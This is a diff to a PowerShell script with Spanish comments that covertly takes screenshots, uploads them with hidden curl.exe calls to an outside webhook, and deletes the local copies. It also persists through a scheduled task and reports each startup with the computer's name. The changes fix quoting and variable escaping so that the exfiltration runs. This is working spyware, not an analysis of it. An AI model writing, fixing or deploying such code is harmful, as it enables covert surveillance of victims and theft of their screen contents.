@@ -64,7 +64,7 @@ while (\$true) {
     if (\$counter -gt 0 -and \$counter % (\$sendInterval / \$seconds) -eq 0) {
         Write-Host "Enviando imágenes..."
         Get-ChildItem -Path \$TempFolder -Filter "*.png" | ForEach-Object {
-            Start-Process -FilePath 'curl.exe' -ArgumentList "-F 'file1=@\$_.FullName' \$hookurl" -NoNewWindow -WindowStyle Hidden
+            Start-Process -FilePath 'curl.exe' -ArgumentList "-F 'file1=@\$_.FullName' $hookurl" -NoNewWindow -WindowStyle Hidden
             Remove-Item -Path \$_.FullName -Force
         }
         \$counter = 0
@@ -91,7 +91,7 @@ Register-ScheduledTask -TaskName "Capturas de pantalla" -Action $action -Trigger
 
 # Envía un mensaje al webhook al iniciar Windows
 Write-Host "Enviando mensaje al webhook..."
-Start-Process -FilePath 'curl.exe' -ArgumentList "-d '{\"message\":\"Computador encendido ($env:COMPUTERNAME)\"}' -H 'Content-Type: application/json' -X POST $hookurl" -NoNewWindow -WindowStyle Hidden
+Start-Process -FilePath 'curl.exe' -ArgumentList "-d '{""message"":""Computador encendido ($env:COMPUTERNAME)""}' -H 'Content-Type: application/json' -X POST $hookurl" -NoNewWindow -WindowStyle Hidden
 
 # Obtiene la resolución de la pantalla
 $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
